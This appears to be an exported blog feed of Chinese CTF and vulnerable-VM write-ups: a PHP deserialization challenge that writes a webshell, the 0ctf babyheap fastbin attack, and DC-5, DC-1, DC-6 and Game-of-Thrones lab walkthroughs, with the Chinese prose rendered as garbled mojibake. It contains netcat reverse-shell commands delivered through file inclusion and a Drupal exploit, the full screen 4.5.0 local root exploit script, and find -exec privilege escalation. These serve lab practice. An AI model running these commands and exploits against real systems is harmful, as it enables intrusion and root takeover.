public function loadData($data){ if(substr($data, 0, 2) !== '0:' &amp;&amp; !preg_match('/0:\d:\/', $data)){ return unserialize($data); } return []; } public function createCache($file=null, $tpl=null){ $file = $file ?? $this-&gt;cacheFile; $tpl = $tpl ?? $this-&gt;template; file_put_contents($file, $tpl); } public function render($data){ echo sprintf($this-&gt;template, htmlspecialchars($data['name'])); } public function __destruct() { $this-&gt;createCache(); } } new Template($_COOKIE['data']); 123456789101112è¿™é“é¢˜ä¹Ÿæ˜¯ååºåˆ—åŒ–çš„åº”ç”¨ï¼Œåˆ©ç”¨æ€è·¯å¾ˆæ¸…æ™°å°±æ˜¯é€šè¿‡`__destruct`è°ƒç”¨`createCache`å†™å…¥ä¸€ä¸ªwebshellé‡ç‚¹åœ¨äºŽè¿™é‡Œï¼š```php public function loadData($data)&#123; if(substr($data, 0, 2) !== &apos;0:&apos; &amp;&amp; !preg_match(&apos;/0:\d:\/&apos;, $data))&#123; return unserialize($data); &#125; return []; &#125; å¦‚æžœç»•è¿‡è¿™ä¸ªifåˆ¤æ–­ï¼Œè¿™é‡Œéœ€è¦åˆ†æžä¸€ä¸‹phpçš„æºç ï¼šåœ¨'O:',åŽé¢å¯ä»¥å¢žåŠ '+'ï¼Œç”¨æ¥ç»•è¿‡æ­£åˆ™åˆ¤æ–­ã€‚ å‚è€ƒ PHPååºåˆ—åŒ–æ¼æ´žç®€ä»‹åŠç›¸å…³æŠ€å·§å°ç»“]]></content>
      <tags>
        <tag>php</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctfbabyheap]]></title>
    <url>%2F2019%2F08%2F10%2F0ctfbabyheap%2F</url>
    <content type="text"><![CDATA[è¢«0ctfçš„è¿™é“é¢˜ç›®æžäº†å¥½ä¹…ã€‚è®°å½•ä¸€ä¸‹ æ€è·¯æ˜¯ä½¿ç”¨fastbin attackï¼Œhow2heapä¸Šæœ‰ä¸€ä¸ªæ —å­å¯ä»¥åˆ†æžä¸€ä¸‹ å…ˆç”³è¯·5ä¸ªchunkï¼Œfreeä¹‹åŽä½¿å¾— fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL 12345678allocate(0x10) # idx 0, 0x00allocate(0x10) # idx 1, 0x20allocate(0x10) # idx 2, 0x40allocate(0x10) # idx 3, 0x60allocate(0x80) # idx 4, 0x80# free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULLfree(2)free(1) æ­¤æ—¶çš„bins 12345678910pwndbg&gt; binsfastbins0x20: 0x5619d93ea020 â€”â–¸ 0x5619d93ea040 â—‚â€” 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbin 1234567891011121314151617181920pwndbg&gt; x/40gx 0x5619d93ea0000x5619d93ea000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5619d93ea010: 0x0000000000000000 0x00000000000000000x5619d93ea020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5619d93ea030: 0x00005619d93ea040 0x00000000000000000x5619d93ea040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5619d93ea050: 0x0000000000000000 0x00000000000000000x5619d93ea060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5619d93ea070: 0x0000000000000000 0x00000000000000000x5619d93ea080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x5619d93ea090: 0x0000000000000000 0x00000000000000000x5619d93ea0a0: 0x0000000000000000 0x00000000000000000x5619d93ea0b0: 0x0000000000000000 0x00000000000000000x5619d93ea0c0: 0x0000000000000000 0x00000000000000000x5619d93ea0d0: 0x0000000000000000 0x00000000000000000x5619d93ea0e0: 0x0000000000000000 0x00000000000000000x5619d93ea0f0: 0x0000000000000000 0x00000000000000000x5619d93ea100: 0x0000000000000000 0x00000000000000000x5619d93ea110: 0x0000000000000000 0x0000000000020ef10x5619d93ea120: 0x0000000000000000 0x0000000000000000 ç„¶åŽæˆ‘ä»¬ä¿®æ”¹idx2çš„æŒ‡é’ˆ,é€šè¿‡fill idx0é€ æˆæº¢å‡ºï¼ŒåŒæ—¶ç”±äºŽå†…å­˜å¯¹é½ï¼Œå¯ä»¥è‚¯å®šidx4çš„æŒ‡é’ˆæœ€åŽè‚¯å®šæ˜¯0x80 ä¿®æ”¹åŽå¦‚ä¸‹ï¼š 1234567891011pwndbg&gt; x/40gx 0x560e5e91c0000x560e5e91c000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x560e5e91c010: 0x6161616161616161 0x61616161616161610x560e5e91c020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x560e5e91c030: 0x0000560e5e91c080 0x0000000000000000 0x560e5e91c040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x560e5e91c050: 0x0000000000000000 0x00000000000000000x560e5e91c060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x560e5e91c070: 0x0000000000000000 0x00000000000000000x560e5e91c080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x560e5e91c090: 0x0000000000000000 0x0000000000000000 æ­¤æ—¶çš„binsæŒ‡å‘ï¼š 123456pwndbg&gt; binsfastbins0x20: 0x560e5e91c020 â€”â–¸ 0x560e5e91c080 â—‚â€” 0x0 (idx2--&gt;idx4)0x30: 0x00x40: 0x00x50: 0x0 å¦‚æžœå†è¿žç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡æ˜¯idx2ï¼Œç¬¬äºŒæ¬¡å°±æ˜¯idx4 ä½†æ˜¯mallocæœ‰ä¸€ä¸ªcheckæœºåˆ¶ï¼Œå¦‚æžœä¸¤ä¸ªfastbinçš„å¤§å°ä¸ä¸€æ ·å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å€Ÿç”¨ä¸€ä¸‹idx3ï¼Œè®©å…¶æº¢å‡ºåˆ°idx4ï¼Œä¿®æ”¹idx4çš„å¤§å° 1234567891011pwndbg&gt; x/40gx 0x5573e66cd000 0x5573e66cd000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5573e66cd010: 0x6161616161616161 0x6161616161616161 0x5573e66cd020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5573e66cd030: 0x00005573e66cd080 0x00000000000000000x5573e66cd040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5573e66cd050: 0x0000000000000000 0x00000000000000000x5573e66cd060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5573e66cd070: 0x6161616161616161 0x61616161616161610x5573e66cd080: 0x0000000000000000 0x0000000000000021 ---&gt;idx40x5573e66cd090: 0x0000000000000000 0x0000000000000000 æ­¤æ—¶idx4çš„å¤§å°å·²ç»è¢«ä¿®æ”¹äº†ï¼ŒäºŽæ˜¯å¯ä»¥ç”³è¯·äº† 12allocate(0x10) # idx 1allocate(0x10) # idx 2, which point to idx4's location ä¹‹åŽï¼Œå¦‚æžœæˆ‘ä»¬æƒ³è¦å°† idx 4 æ”¾åˆ° unsorted bin ä¸­çš„è¯ï¼Œå…ˆéœ€è¦æŠŠå®ƒçš„å¤§å°æ”¹å›žæ¥ï¼ŒåŒæ—¶ä¸ºäº†é˜²æ­¢å…¶ä¸Ž top chunk åˆå¹¶ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡ç”³è¯·ä¸€ä¸ª chunkã€‚æ­¤åŽå†é‡Šæ”¾ idx4 å°±ä¼šè¿›å…¥ unsorted bin ä¸­åŽ»äº†ã€‚ 1234567891011121314pwndbg&gt; x/40gx 0x559b5b9a50000x559b5b9a5000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x559b5b9a5010: 0x6161616161616161 0x6161616161616161 0x559b5b9a5020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x559b5b9a5030: 0x0000000000000000 0x00000000000000000x559b5b9a5040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x559b5b9a5050: 0x0000000000000000 0x00000000000000000x559b5b9a5060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x559b5b9a5070: 0x6161616161616161 0x61616161616161610x559b5b9a5080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x559b5b9a5090: 0x00007fa9e254eb78 0x00007fa9e254eb780x559b5b9a50a0: 0x0000000000000000 0x00000000000000000x559b5b9a50b0: 0x0000000000000000 0x00000000000000000x559b5b9a50c0: 0x0000000000000000 0x0000000000000000 æ­¤æ—¶dump(2)å°±å¯ä»¥å¾—åˆ°unsorted bin çš„åœ°å€äº†ã€‚ æ­¤æ—¶çš„binså¦‚ä¸‹ 123456789101112pwndbg&gt; binsfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x559b5b9a5080 â€”â–¸ 0x7fa9e254eb78 (main_arena+88) â—‚â€” 0x559b5b9a5080smallbins]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>onegadget</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DCé¶æœºæ¸—é€]]></title>
    <url>%2F2019%2F08%2F09%2FDC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[DC 5 ä¹‹å‰ä¸€ç›´æ²¡èƒ½å¤Ÿç¡®è®¤é¶æœºçš„ipåœ°å€ï¼Œå…¶å®žåªéœ€è¦å°†ç½‘ç»œè¿žæŽ¥æ¨¡å¼ä¿®æ”¹ä¸ºNATæ¨¡å¼é‡å¯ä¸€ä¸‹å°±è¡Œäº† 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.167 00:0c:29:fd:e8:73 VMware, Inc. ---&gt; DC5é¶æœº192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded masscanæ‰«å‡ºäº†å‡ ä¸ªç«¯å£ï¼š 12345678910# root @ kali in ~ [4:09:46] $ masscan -p0-65535 192.168.41.167 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.41.167 Discovered open port 111/tcp on 192.168.41.167 Discovered open port 33188/tcp on 192.168.41.167 ç„¶åŽä¸Šnmapæ‰«æœåŠ¡ 12345678910111213141516# root @ kali in ~ [4:10:42] $ nmap -p80,111,33188 -sV -T4 192.168.41.167Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDTStats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)Nmap scan report for 192.168.41.167Host is up (0.00042s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.6.2111/tcp open rpcbind 2-4 (RPC #100000)33188/tcp open status 1 (RPC #100024)MAC Address: 00:0C:29:FD:E8:73 (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds è®¿é—®åŽŸå§‹ç½‘é¡µï¼š dirsearch.pyä¼¼ä¹Žæ²¡æœ‰å‘çŽ°ä»€ä¹ˆ 123456Target: http://192.168.41.167 [16:24:35] Starting:[16:24:35] 400 - 172B - /%2e%2e/google.com[16:24:42] 301 - 184B - /css -&gt; http://192.168.41.167/css/[16:24:44] 301 - 184B - /images -&gt; http://192.168.41.167/images/[16:24:44] 200 - 4KB - /index.php çœ‹äº†å¸ˆå‚…ä»¬çš„æç¤ºï¼Œå‘çŽ°footer.phpå¾ˆæœ‰è¶£ æ¯æ¬¡åˆ·æ–°æ•°å­—éƒ½ä¼šå˜åŒ– åŒæ—¶å‘çŽ°åœ¨ http://192.168.41.167/thankyou.phpé¡µé¢ä¹Ÿæœ‰è¿™ç§æ•ˆæžœï¼ŒäºŽæ˜¯çŒœæƒ³æ˜¯ä¸æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ž è®¿é—®http://192.168.41.167/thankyou.php?file=/etc/passwdï¼Œé¡µé¢å›žæ˜¾äº†ï¼ åŒæ—¶è¯¥ä¸»æœºä½¿ç”¨çš„æ˜¯nginxæœåŠ¡ï¼ŒäºŽæ˜¯å¯ä»¥å†™ä¸€ä¸ªshellåˆ°æ—¥å¿—ä¸­å¹¶ä¸”åŒ…å«è¿™ä¸ªæ–‡ä»¶ å†™å…¥webshellï¼Œæ³¨æ„è¿™é‡Œä½¿ç”¨çš„æ˜¯passthruå‡½æ•° åŒ exec() å‡½æ•°ç±»ä¼¼ï¼Œ passthru() å‡½æ•° ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼ˆcommandï¼‰çš„ã€‚ å½“æ‰€æ‰§è¡Œçš„ Unix å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦ç›´æŽ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™ï¼Œ éœ€è¦ç”¨æ­¤å‡½æ•°æ¥æ›¿ä»£ exec() æˆ– system() å‡½æ•°ã€‚ å¸¸ç”¨æ¥æ‰§è¡Œè¯¸å¦‚ pbmplus ä¹‹ç±»çš„å¯ä»¥ç›´æŽ¥è¾“å‡ºå›¾åƒæµçš„å‘½ä»¤ã€‚ é€šè¿‡è®¾ç½® Content-type ä¸º image/gifï¼Œ ç„¶åŽè°ƒç”¨ pbmplus ç¨‹åºè¾“å‡º gif æ–‡ä»¶ï¼Œ å°±å¯ä»¥ä»Ž PHP è„šæœ¬ä¸­ç›´æŽ¥è¾“å‡ºå›¾åƒåˆ°æµè§ˆå™¨ã€‚ kaliç›‘å¬ä¸€ä¸ªç«¯å£ç„¶åŽè®¿é—®å¦‚ä¸‹è·¯ç”±åŽ»åŒ…å«æ–‡ä»¶å¹¶ä¸”å¼¹shell http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash æ ¸å¿ƒå‘½ä»¤nc 192.168.41.165 -c /bin/bash æ­¤æ—¶çš„æƒé™æ˜¯www-data æŽ¥ä¸‹æ¥çœ‹å¦‚ä½•ææƒ ä¸Šææƒè¾…åŠ©è„šæœ¬ é“¾æŽ¥ å‘çŽ°æœ‰è¿™ä¸ªæ–‡ä»¶ exploit-dbä¸Šæœä¸€ä¸‹expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo "~ gnu/screenroot ~"echo "[+] First, we create our shell and library..."cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123; chown("/tmp/rootshell", 0, 0); chmod("/tmp/rootshell", 04755); unlink("/etc/ld.so.preload"); printf("[+] done!\n");&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123; setuid(0); setgid(0); seteuid(0); setegid(0); execvp("/bin/sh", NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so... /tmp/rootshell DC5åŽè®° thankyou.phpæ–‡ä»¶ä¸­æœ‰ä»¥ä¸‹å†…å®¹ï¼›å…¸åž‹çš„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ž 12345678910111213141516&lt;div class="footer-wrapper"&gt; &lt;footer&gt; &lt;?php $file = $_GET['file']; if(isset($file)) &#123; include("$file"); &#125; else &#123; include("footer.php"); &#125; ?&gt; &lt;/footer&gt; DC1 arp-scanå‘çŽ°ä¸»æœº 12345678# root @ kali in ~ [9:46:49] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.168 00:0c:29:9f:4c:60 VMware, Inc. ---&gt; DC1é¶æœº192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc. æ‰«æç«¯å£ 1234567891011# root @ kali in ~ [9:46:56] $ masscan -p0-65535 192.168.41.168 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 13:47:23 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 111/tcp on 192.168.41.168 Discovered open port 47738/tcp on 192.168.41.168 Discovered open port 22/tcp on 192.168.41.168 Discovered open port 80/tcp on 192.168.41.168 å‘çŽ°80ç«¯å£æ˜¯ä¸€ä¸ªcmsï¼Œåå­—å«drupal metasploitæœç´¢ä¸€ä¸‹drupalçš„æ¸—é€æ¨¡å— 123456789101112msf5 &gt; search drupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 1 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 2 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 3 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 4 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 5 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection ç„¶åŽè®¾ç½®ç›¸å…³å‚æ•°ï¼ŒèŽ·å¾—shell 123456789101112131415161718msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.41.168RHOSTS =&gt; 192.168.41.168msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.41.165:4444 [*] Sending stage (38247 bytes) to 192.168.41.168[*] Meterpreter session 1 opened (192.168.41.165:4444 -&gt; 192.168.41.168:41848) at 2019-08-09 09:48:32 -0400meterpreter &gt; meterpreter &gt; lsListing: /var/www=================Mode Size Type Last modified Name---- ---- ---- ------------- ----100644/rw-r--r-- 174 fil 2013-11-20 15:45:59 -0500 .gitignore100644/rw-r--r-- 5767 fil 2013-11-20 15:45:59 -0500 .htaccess ä½†æ˜¯ä¹‹åŽåªèƒ½èŽ·å¾—ä¸€ä¸ªMeterpreter,ä¸æ˜¯rootç”¨æˆ·ä¹Ÿæ²¡æ³•è¿è¡ŒLinuxçš„å¸¸ç”¨å‘½ä»¤ï¼ŒäºŽæ˜¯æƒ³åˆ°ä¿®æ”¹payload 123456msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/execpayload =&gt; php/execmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set CMD nc 192.168.41.165 2333 -c /bin/bashCMD =&gt; nc 192.168.41.165 2333 -c /bin/bashmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit æ­¤æ—¶æœ¬æœºç›‘å¬ä¸€ä¸ª2333ç«¯å£ï¼ŒæˆåŠŸåå¼¹shell 123456789$ nc -lvp 2333 listening on [any] 2333 ...192.168.41.168: inverse host lookup failed: Unknown hostconnect to [192.168.41.165] from (UNKNOWN) [192.168.41.168] 60424lsCOPYRIGHT.txtINSTALL.mysql.txtINSTALL.pgsql.txtINSTALL.sqlite.txt æ­¤æ—¶ä¸Šææƒè¾…åŠ©è„šæœ¬ï¼š wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh æ·»åŠ å¯æ‰§è¡Œæƒé™å¹¶ä¸”è¿è¡Œï¼Œé‡ç‚¹å…³æ³¨ï¼š 1234567891011121314151617181920[-] SUID files:-rwsr-xr-x 1 root root 88744 Dec 10 2012 /bin/mount-rwsr-xr-x 1 root root 31104 Apr 13 2011 /bin/ping-rwsr-xr-x 1 root root 35200 Feb 27 2017 /bin/su-rwsr-xr-x 1 root root 35252 Apr 13 2011 /bin/ping6-rwsr-xr-x 1 root root 67704 Dec 10 2012 /bin/umount-rwsr-sr-x 1 daemon daemon 50652 Oct 4 2014 /usr/bin/at-rwsr-xr-x 1 root root 35892 Feb 27 2017 /usr/bin/chsh-rwsr-xr-x 1 root root 45396 Feb 27 2017 /usr/bin/passwd-rwsr-xr-x 1 root root 30880 Feb 27 2017 /usr/bin/newgrp-rwsr-xr-x 1 root root 44564 Feb 27 2017 /usr/bin/chfn-rwsr-xr-x 1 root root 66196 Feb 27 2017 /usr/bin/gpasswd-rwsr-sr-x 1 root mail 83912 Nov 18 2017 /usr/bin/procmail-rwsr-xr-x 1 root root 162424 Jan 6 2012 /usr/bin/find-rwsr-xr-x 1 root root 937564 Feb 11 2018 /usr/sbin/exim4-rwsr-xr-x 1 root root 9660 Jun 20 2017 /usr/lib/pt_chown-rwsr-xr-x 1 root root 248036 Jan 27 2018 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 5412 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-- 1 root messagebus 321692 Feb 10 2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 84532 May 22 2013 /sbin/mount.nfs ä½†æ˜¯æ­¤æ—¶å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œè¦è®²çš„æ˜¯ç”¨fingå‘½ä»¤ææƒ find ä¹‹exec éšä¾¿åˆ›å»ºä¸€ä¸ªæ–‡ä»¶touch anquanke ç„¶åŽfindæŸ¥æ‰¾å¹¶ä¸”åŠ ä¸Š-execé€‰é¡¹ï¼š 12find anquanke -exec &apos;whoami&apos; \;root å‘çŽ°æ­¤æ—¶æ˜¯rootç”¨æˆ·ï¼ŒäºŽæ˜¯æ‰§è¡Œ/bin/sh 123find anquanke -exec &apos;/bin/sh&apos; \;whoamiroot è‡³æ­¤ææƒæˆåŠŸäº† DC-6é¶æœºâ€”â€”wordpressæ¸—é€ è€è§„çŸ©æŽ¢æµ‹é¶æœºçš„ipï¼Œç„¶åŽæ‰«æç«¯å£å‘çŽ°å¼€æ”¾äº†80ï¼ŒæŒ‰ç…§ä¸‹è½½æ—¶ä½œè€…çš„æç¤ºéœ€è¦ä¿®æ”¹hostsæ–‡ä»¶ 12345678$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 kali192.168.41.129 wordy# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters ä¹‹å‰kaliä¸Šçš„wpscanæœ‰é—®é¢˜ï¼Œæ›´æ–°é•œåƒæºé‡æ–°å‡çº§äº†ä¸€ä¸‹ wpscan --url http://wordy/ -e -t 20 ç›´æŽ¥æ‰«ä¸€ä¸‹çœ‹èƒ½æœ‰ä»€ä¹ˆç»“æžœ æ‰«æåˆ°ç”¨æˆ·ï¼š 12345678910111213141516171819202122232425[i] User(s) Identified:[+] admin | Detected By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] mark | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] sarah | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] jens | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] graham | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) ä¸‹ä¸€æ­¥æ ¹æ®ä¸Šé¢ä¸‹è½½åœ°å€å¤„ä½œè€…çš„æç¤ºï¼Œæˆ‘ä»¬ç”Ÿäº§ä¸€ä¸ªå­—å…¸åŒ… 12# root @ kali in ~ [21:29:41] $ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt ä¹‹åŽä½¿ç”¨wpscançˆ†ç ´å¯†ç ï¼Œç™»é™†åŽå°å¼€å§‹ææƒ å‚è€ƒ Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨ æ¸—é€æµ‹è¯•å®žæˆ˜-DC-1:1é¶æœºå…¥ä¾µ+Matrix2é¶æœºå…¥ä¾µ æ¸—é€æµ‹è¯•å®žæˆ˜â€”â€”DC-5+DC-6é¶æœºå…¥ä¾µ Linuxææƒè¾…åŠ©è„šæœ¬ Game-of-Thrones-CTF-1é¶æœºå¤çŽ° ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¶æœº æ‰«æé¶æœºipåœ°å€ 1234567# root @ kali in ~ [19:58:22] $ arp-scan 192.168.19.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.19.2 00:50:56:f9:02:e9 VMware, Inc.192.168.19.131 00:0c:29:d0:e7:e1 VMware, Inc. ---&gt; é¶æœº192.168.19.254 00:50:56:e8:10:0e VMware, Inc. æ‰«æç«¯å£ 1234567891011121314# root @ kali in ~ [19:59:38] $ masscan -p0-65535 192.168.19.131 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-10 23:59:47 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.19.131 Discovered open port 21/tcp on 192.168.19.131 Discovered open port 1337/tcp on 192.168.19.131 Discovered open port 10000/tcp on 192.168.19.131 Discovered open port 53/tcp on 192.168.19.131 Discovered open port 22/tcp on 192.168.19.131 Discovered open port 5432/tcp on 192.168.19.131 æ‰«æç«¯å£å¯¹åº”çš„æœåŠ¡ï¼š 12345678910111213141516171819202122232425# root @ kali in ~ [20:00:24] $ nmap -sV -T4 192.168.19.131 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:02 EDTStats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 83.33% done; ETC: 20:04 (0:00:19 remaining)Nmap scan report for 192.168.19.131Host is up (0.000085s latency).Not shown: 992 closed portsPORT STATE SERVICE VERSION21/tcp open ftp?22/tcp open ssh Linksys WRT45G modified dropbear sshd (protocol 2.0)53/tcp open domain (unknown banner: Bind)80/tcp open http Apache httpd143/tcp filtered imap3306/tcp filtered mysql5432/tcp open postgresql PostgreSQL DB 9.6.4 - 9.6.610000/tcp open http MiniServ 1.590 (Webmin httpd)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port21-TCP:V=7.70%I=7%D=8/10%Time=5D4F5B1F%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,11C,&quot;220-------------------------\r\n220-\&quot;These\x20are\x20theSF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\&quot;\x20-\x20Grey\x20SF:Worm\r\n220-\r\n220-\&quot;A\x20fail2ban\x20spell\x20is\x20protecting\x20theSF:se\x20walls\.\x20You&apos;ll\x20never\x20get\x20in\&quot;\x20-\x20One\x20of\x20th... æ­¤æ—¶80ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ‰€ä»¥å¯ä»¥æ‰«æä¸€ä¸‹ç›®å½•ï¼š 123456789[20:04:36] 200 - 1KB - /favicon.ico[20:04:37] 301 - 232B - /h -&gt; http://192.168.19.131/h/[20:04:37] 200 - 3KB - /index.php/login/[20:04:37] 200 - 3KB - /index.php[20:04:37] 301 - 233B - /js -&gt; http://192.168.19.131/js/[20:04:38] 301 - 236B - /music -&gt; http://192.168.19.131/music/[20:04:40] 200 - 135B - /robots.txt[20:04:40] 403 - 222B - /server-status[20:04:40] 403 - 223B - /server-status/ robots.txtæ–‡ä»¶ ä¾æ¬¡è®¿é—®è¿™äº›é¡µé¢ï¼ŒåŒæ—¶è®°å¾—æŸ¥çœ‹æºä»£ç ï¼Œå…·ä½“çš„åˆ†æžä¹‹åŽå†æž 1234 /the-tree/User-agent: *Disallow: /secret-island/Disallow: /direct-access-to-kings-landing/ å‚è€ƒ Game-of-Thrones-CTF-1é¶æœºå®Œå…¨æ”»ç•¥ DC-2é¶æœº åŒæ 